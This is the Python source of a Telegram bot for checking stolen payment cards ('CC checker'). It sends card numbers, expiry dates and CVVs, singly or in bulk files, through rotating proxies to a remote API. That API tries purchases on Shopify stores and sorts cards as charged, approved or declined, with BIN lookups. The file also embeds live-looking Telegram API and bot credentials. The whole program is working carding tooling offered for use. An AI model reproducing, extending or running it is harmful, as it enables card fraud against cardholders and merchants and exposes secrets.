from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

API_ID = 39283277
API_HASH = '56cd66f3f3fd7da78db44263ea05e0dc'
BOT_TOKEN = '8999656261:AAEqwyXA0rwAs9h6FmA07Gbnn0tTttcbWMw'
ADMIN_ID = [7681846627]
CHECKER_API_URL = 'https://web-production-3d364.up.railway.app/shopify'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}

# Store card data from uploaded txt files (key: message_id or user_id, value: cards list)
uploaded_cards_data = {}


PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    """Convert all emojis to premium animated emojis with bold/highlight."""
    if not text:
        return text

    result = text

    # First, replace all known emojis with premium animated versions
    for emoji_char, emoji_id in PREMIUM_EMOJI_IDS.items():
        if emoji_char in result:
            # Use bold and background highlight for visibility
            result = result.replace(
                emoji_char,
                f'<b><tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji></b>'
            )

    # For any remaining emojis that might not be in our mapping,
    # wrap them in bold to make them more visible
    chars = list(result)
    processed = []
    in_tag = False

    for i, char in enumerate(chars):
        if char == '<':
            in_tag = True
            processed.append(char)
            continue
        if char == '>':
            in_tag = False
            processed.append(char)
            continue

        if not in_tag and char not in PREMIUM_EMOJI_IDS:
            # Wrap unknown emojis in bold for better visibility
            processed.append(f'<b>{char}</b>')
        else:
            processed.append(char)

    result = ''.join(processed)

    # Add a subtle background highlight to the whole message for dark mode visibility
    # This helps emojis pop out better against dark backgrounds
    return result

def normalize_proxy(proxy):
    """
    Normalize proxy format to IP:PORT@USERNAME:PASSWORD format.

    Supports input formats:
    - IP:PORT:USERNAME:PASSWORD (Telegram bot user format)
    - IP:PORT@USERNAME:PASSWORD (Correct API format)
    - IP:PORT (no auth)

    Returns proxy in format: IP:PORT@USERNAME:PASSWORD or IP:PORT
    """
    if not proxy:
        return None

    proxy = proxy.strip()

    # Already in correct format: host:port@user:pass
    if '@' in proxy:
        return proxy

    # Format: ip:port:user:pass (4 parts with colons)
    proxy_parts = proxy.split(':')

    if len(proxy_parts) == 4:
        # IP:PORT:USERNAME:PASSWORD -> IP:PORT@USERNAME:PASSWORD
        ip, port, user, password = proxy_parts
        return f"{ip}:{port}@{user}:{password}"
    elif len(proxy_parts) == 2:
        # IP:PORT (no auth)
        return proxy
    else:
        # Unknown format, return as-is
        return proxy

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cmd", b"show_cmds", style="success"),
         Button.url(" Channel", "https://t.me/bRaiN_Ai_Main", style="success")]
    ]
    
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="success")])
    
    return buttons


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users:
                        f.write(f"{u}\n")
        return users
    except Exception as e:
        print(f"Error loading premium users: {e}")
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

# Error messages that should trigger a retry with new site/proxy
RETRY_ERROR_MESSAGES = [
    "No Valid Products",
    "MERCHANDISE_OUT_OF_STOCK",
    "policy_class",
    "Proxy Error:",
    "ARTIFACT_DISSATISFACTION",
    "Proxy Dead",
    "Site Error",
    "500",
    "price 0.0"
]

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    
    if not gateway or gateway == "Unknown":
        return True
    
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    
    return False

def should_retry_on_error(response_msg):
    """Check if the response message contains errors that should trigger a retry."""
    if not response_msg:
        return True
    
    response_lower = response_msg.lower()
    
    for error_msg in RETRY_ERROR_MESSAGES:
        if error_msg.lower() in response_lower:
            return True
    
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        if not site.startswith('http'):
            site = f'https://{site}'
        
        # Normalize proxy format (handles IP:PORT:USERNAME:PASSWORD -> IP:PORT@USERNAME:PASSWORD)
        proxy_str = normalize_proxy(proxy)

        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price != '-' and price != 0:
            price = f"${price}"
        gateway = raw.get('Gateway', 'Shopify')
        status_api = raw.get('Status', False)

        if is_site_dead(response_msg, gateway, price) or should_retry_on_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        response_lower = response_msg.lower()

        if 'charged' in response_lower or 'order_placed' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip', 'cvv issue',
            '3d', '3d secure', 'otp', 'verification required',
            'authenticate', 'authentication required', 'challenge required',
            'redirecting to bank', 'bank verification', 'send code',
            'enter code', 'verify'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        # Check if it's a proxy error and mark for retry
        proxy_error_keywords = ['proxy', 'curl', 'conn', 'connection', 'timeout', 'refused', 'reset', 'abort', 'ssl', 'tls']
        is_proxy_error = any(keyword in error_msg.lower() for keyword in proxy_error_keywords)

        if is_proxy_error:
            return {'status': 'Proxy Error', 'message': f'Proxy Error: {error_msg}', 'card': card, 'retry': True}
        else:
            return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=3):
    """
    Check card with retry logic.
    Retries up to max_retries times when encountering specific error messages:
    - No Valid Products
    - MERCHANDISE_OUT_OF_STOCK
    - policy_class
    - Proxy Error:
    - ARTIFACT_DISSATISFACTION
    - Proxy Dead
    - Site Error
    - 500
    - price 0.0
    """
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        # Check if we should retry based on the error message
        response_msg = result.get('message', '')
        if result.get('retry') or should_retry_on_error(response_msg):
            last_result = result
            if attempt < max_retries - 1:
                # Retry with new site/proxy
                await asyncio.sleep(0.3)
                continue
            else:
                # Max retries reached
                break
        else:
            # Success or non-retryable error
            return result

    if last_result:
        # Check if the last error was a proxy error and provide a cleaner message
        last_msg = last_result.get('message', '')
        if 'proxy error' in last_msg.lower() or 'curl' in last_msg.lower() or 'conn' in last_msg.lower():
            error_msg = 'Connection failed - try again with different proxy'
        else:
            error_msg = f'Site error: {last_msg}'
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gateway : {result.get('gateway', 'Unknown')}
📝 Response : {result['message'][:150]}
💸 Price : {result.get('price', '-')}


🆔 BIN Info : {brand} - {bin_type} - {level}
🏦 Bank : {bank}
🥰 Country : {country} {flag}"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    progress_text = f""" 💳  Card: <code>{results.get('last_card', 'None')}</code>
    
💰 {results.get('last_price', '-')}
    
📝 {results.get('last_response', 'Waiting...')[:30]}
    """

    buttons = [
        [Button.inline(f" CHARGED {len(results['charged'])}", b"none", style="success")],
        [Button.inline(f" APPROVED {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f" DECLINED {len(results['dead'])}", b"none", style="danger")],
        [Button.inline(" STOP", f"stop_{user_id}".encode(), style="danger")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""✅ Check Complete! ✅

📊 Results:
   ┣ ✅ Charged: {len(results['charged'])}
   ┣ 🔥 Approved: {len(results['approved'])}
   ┣ ❌ Declined: {len(results['dead'])}
   ┗ 📊 Total: {results['total']}

Hits:
{hits_text}

💡 Made by @White_DeviL3620"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Brain_Ai{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass


async def test_site_with_details(site, proxy):
    test_card = "4363635834771491|08|2034|309"
    
    # Dead site indicators (error messages that mean site is dead)
    dead_indicators = [
        "empty submit response",
        "site throttled request",
        "unable to get payment token",
        "no valid payment method found",
        "site error",
        "404",
        "site requires login",
        "cart failed",
        "not shopify",
        "503",
        "422"
    ]
    
    try:
        if not site.startswith('http'):
            site = f'https://{site}'

        # Normalize proxy format (handles IP:PORT:USERNAME:PASSWORD -> IP:PORT@USERNAME:PASSWORD)
        proxy_str = normalize_proxy(proxy)

        # Build API URL in format: CHECKER_API_URL?site={site}&cc={test_card}&proxy={proxy}
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP {resp.status}', 'proxy': proxy_str or 'None'}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON', 'proxy': proxy_str or 'None'}
        
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price = raw.get('Price', '-')
        
        # Check if response contains any dead indicators
        response_lower = response_msg.lower()
        is_dead = False
        for indicator in dead_indicators:
            if indicator.lower() in response_lower:
                is_dead = True
                break
        
        # Also check HTTP status codes in response
        if not is_dead and any(code in response_lower for code in ['404', '503', '422', '500', '502', '504']):
            is_dead = True
        
        status = 'dead' if is_dead else 'alive'
        return {'site': site, 'status': status, 'price': price, 'response': response_msg, 'proxy': proxy_str or 'None'}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50], 'proxy': proxy_str if 'proxy_str' in locals() else 'None'}

async def test_proxy(proxy):
    try:
        # Normalize proxy format first (handles both IP:PORT:USERNAME:PASSWORD and IP:PORT@USERNAME:PASSWORD)
        normalized_proxy = normalize_proxy(proxy)

        if not normalized_proxy:
            return {'proxy': proxy, 'status': 'dead'}

        # Parse the normalized format (IP:PORT@USERNAME:PASSWORD or IP:PORT)
        if '@' in normalized_proxy:
            host_port, credentials = normalized_proxy.split('@', 1)
            proxy_url = f'http://{credentials}@{host_port}'
        else:
            # No authentication
            proxy_url = f'http://{normalized_proxy}'

        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.google.com/', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   🦉 Add proxy: <code>/addproxy</code>
   🦉 Add sites: <code>/site</code>
   🦉 Check CC: <code>/sp card|mm|yy|cvv</code>

💡 Made by @White_DeviL3620"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 User Commands

🛒 Shopify
├─ <code>/sp cc|mm|yy|cvv</code> → Check single card
└─ <code>/sptxt</code> → Mass check from .txt file

🔧 Site Management
├─ <code>/site</code> → Check & remove dead sites
└─ <code>/rm url</code> → Remove a specific site

🔌 Proxy Management
├─ <code>/proxy</code> → Check & remove dead proxies
├─ <code>/addproxy</code> → Add proxies
├─ <code>/chkproxy proxy</code> → Check single proxy
├─ <code>/rmproxy proxy</code> → Remove single proxy
├─ <code>/rmproxyindex 1,2,3</code> → Remove by index
├─ <code>/clearproxy</code> → Remove all proxies
└─ <code>/getproxy</code> → Get all proxies

☠️ Other Tools
└─ <code>/bin bin_number</code> → Get BIN details extract"""
    
    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return
    
    admin_text = """👑 <b>Admin Panel</b>

📋 <b>Premium Management</b>
├─ <code>/addpremium user_id</code> → Add user to premium
├─ <code>/removepremium user_id</code> → Remove user from premium
└─ <code>/listpremium</code> → List all premium users

🌐 <b>Sites Management</b>
├─ <code>/addsites</code> → Reply to .txt file to upload sites
└─ <code>/getsites</code> → Download current sites.txt

📊 <b>Bot Statistics</b>
└─ <code>/stats</code> → Show bot statistics"""

    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')
    
@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Add proxy: <code>/addproxy</code>
   ➥ Add sites: <code>/site</code>
   ➥ Check CC: <code>/sp card|mm|yy|cvv</code>

💡 Made by @White_DeviL3620"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/sp\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{card}</code>..."), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        else:
            status_header = "❌ DECLINED"

        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gateway : {result.get('gateway', 'Unknown')}
📝 Response : {result['message'][:150]}
💸 Price : {result.get('price', '-')}

🆔 BIN Info : {brand} - {bin_type} - {level}
🏦 Bank : {bank}
🥰 Country : {country} {flag}

💡 Made by @White_DeviL3620"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"⚠️ File contains {len(cards)} cards. Limiting to first 5000."), parse_mode='html')
        cards = cards[:5000]

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔥 Starting check for {total_cards} cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '-',
        'last_gateway': 'Unknown'
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        try:
            await status_msg.delete()
        except:
            pass

        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addproxy</code> followed by proxies, one per line."), parse_mode='html')
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist."), parse_mode='html')
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ Added {len(new_proxies)} proxies!"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(premium_emoji(f"🔄 Checking proxies...\n\nChecked: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAlive: {len(alive_proxies)}\nDead: {len(dead_proxies)}"), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(f"✅ Proxy check complete!\n\nTotal: {len(proxies)}\nAlive: {len(alive_proxies)}\nRemoved: {len(dead_proxies)}"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

